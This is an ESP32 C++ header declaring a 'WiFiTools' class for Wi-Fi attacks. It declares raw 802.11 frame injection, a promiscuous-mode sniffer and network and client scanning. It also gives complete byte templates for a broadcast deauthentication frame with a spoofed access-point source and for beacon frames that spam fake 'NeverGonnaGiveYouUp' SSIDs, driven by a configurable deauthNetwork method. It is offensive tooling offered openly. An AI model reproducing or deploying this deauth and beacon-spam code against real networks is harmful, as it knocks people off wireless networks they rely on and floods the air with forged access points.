#ifndef WIFITOOLS_H
#define WIFITOOLS_H

#include <WiFi.h>

#include <vector>

#include "esp_event.h"
#include "esp_event_loop.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "nvs_flash.h"

esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer, int len, bool en_sys_seq);
esp_err_t esp_wifi_set_storage(wifi_storage_t storage);
esp_err_t esp_wifi_set_mode(wifi_mode_t mode);
esp_err_t esp_wifi_start();
esp_err_t esp_wifi_set_promiscuous(bool en);
esp_err_t esp_wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb_t cb);
esp_err_t event_handler(void* ctx, system_event_t* event);

typedef struct {
    unsigned frame_ctrl : 16;
    unsigned duration_id : 16;
    uint8_t addr1[6]; /* receiver address */
    uint8_t addr2[6]; /* sender address */
    uint8_t addr3[6]; /* filtering address */
    unsigned sequence_ctrl : 16;
    uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

class WiFiTools {
   private:
    const bool wpa2 = true;
    char emptySSID[32];
    uint8_t channelIndex = 0;
    uint8_t macAddr[6];
    uint8_t randomMacAddr[6];
    uint8_t wifiChannel = 1;
    uint32_t currentTime = 0;
    uint32_t packetSize = 0;
    uint32_t packetCounter = 0;
    uint32_t attackTime = 0;
    uint32_t packetRateTime = 0;

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    void beaconSpamSetup();
    void generateRandomMac();
    void sendDeauthPacket(uint8_t* apMac, uint8_t* stMac, uint8_t channel, uint8_t reasonCode);
    void initWiFiSniffer();

    static const char* wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type);
    static void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type);

    std::vector<wifi_ap_record_t> foundWiFiNetworks;
    std::vector<wifi_ap_record_t> foundWiFiClients;

    // deauth frame definition
    uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xA0, 0x00,                          // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x3A, 0x01,                          // duration
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // reciever (target)
        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                          // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                           // reason code (1 = unspecified reason)
    };

    // beacon frame definition
    uint8_t beaconPacket[109] = {/*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,              // Type/Subtype: management beacon frame
                                 /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
                                 /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source
                                 /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source

                                 // Fixed parameters
                                 /* 22 - 23 */ 0x00, 0x00,                                      // Fragment & sequence number (will be done by the SDK)
                                 /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,  // Timestamp
                                 /* 32 - 33 */ 0x64, 0x00,                                      // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
                                 /* 34 - 35 */ 0x31, 0x00,                                      // capabilities Information

                                 // Tagged parameters

                                 // SSID parameters
                                 /* 36 - 37 */ 0x00, 0x20,                                                                                                                                                                                      // Tag: Set SSID length, Tag length: 32
                                 /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,  // SSID

                                 // Supported Rates
                                 /* 70 - 71 */ 0x01, 0x08,  // Tag: Supported Rates, Tag length: 8
                                 /* 72 */ 0x82,             // 1(B)
                                 /* 73 */ 0x84,             // 2(B)
                                 /* 74 */ 0x8b,             // 5.5(B)
                                 /* 75 */ 0x96,             // 11(B)
                                 /* 76 */ 0x24,             // 18
                                 /* 77 */ 0x30,             // 24
                                 /* 78 */ 0x48,             // 36
                                 /* 79 */ 0x6c,             // 54

                                 // Current Channel
                                 /* 80 - 81 */ 0x03, 0x01,  // Channel set, length
                                 /* 82 */ 0x01,             // Current Channel

                                 // RSN information
                                 /*  83 -  84 */ 0x30, 0x18,
                                 /*  85 -  86 */ 0x01, 0x00,
                                 /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
                                 /*  91 - 100 */ 0x02, 0x00,
                                 /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
                                 /* 101 - 102 */ 0x01, 0x00,
                                 /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
                                 /* 107 - 108 */ 0x00, 0x00};

    const char* const rickRollSSIDs[8] PROGMEM = {
        "NeverGonnaGiveYouUp",
        "NeverGonnaLetYouDown",
        "NeverGonnaRunAround",
        "AndDesertYou",
        "NeverGonnaMakeYouCry",
        "NeverGonnaSayGoodbye",
        "NeverGonnaTellALie",
        "AndHurtYou"};

   public:
    WiFiTools();
    void nextChannel();
    void rickRollBeaconSpam();
    void scanWiFiNetworks();
    std::vector<wifi_ap_record_t> getAvailableNetworks();
    void clearFoundWiFiNetworks();
    void deauthNetwork(uint8_t* networkSSID, uint8_t* networkBSSID, uint8_t channel, int availableNetworkIndex, uint8_t* targetMacAddr, int numPackets, int delayMs, uint8_t reasonCode);
    void scanForClients();
    std::vector<wifi_sta_info_t> getWiFiClients();
};

#endif  // WIFITOOLS_H